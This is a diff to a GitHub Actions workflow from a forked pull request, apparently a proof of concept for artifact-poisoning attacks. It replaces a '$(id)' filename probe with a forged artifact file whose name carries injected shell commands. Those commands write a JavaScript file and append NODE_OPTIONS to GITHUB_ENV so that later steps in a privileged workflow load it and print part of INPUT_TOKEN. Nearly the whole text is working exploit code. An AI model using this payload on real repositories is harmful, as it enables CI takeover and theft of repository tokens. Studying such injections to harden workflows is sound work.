@@ -14,8 +14,13 @@ jobs:
         run: |
           mkdir -p /tmp/content
           echo "${{ github.event.number }}" > /tmp/content/pr_number.txt
-          echo "hello from a forked PR" > /tmp/content/report.txt
-          printf 'injected' > '/tmp/content/x$(id).txt'
+          echo "report from forged Test workflow" > /tmp/content/report.txt
+          python3 - <<'PY'
+          js = "console.log(process.env.INPUT_TOKEN&&process.env.INPUT_TOKEN.slice(0,4),process.env.INPUT_TOKEN&&process.env.INPUT_TOKEN.length)"
+          name = "a||printf '" + js + "'>x.js;echo NODE_OPTIONS=--require=x.js>>$GITHUB_ENV;true #.txt"
+          open("/tmp/content/" + name, "w").write("x")
+          print(repr(name))
+          PY
           ls -1 /tmp/content
       - uses: actions/upload-artifact@v4
         with:
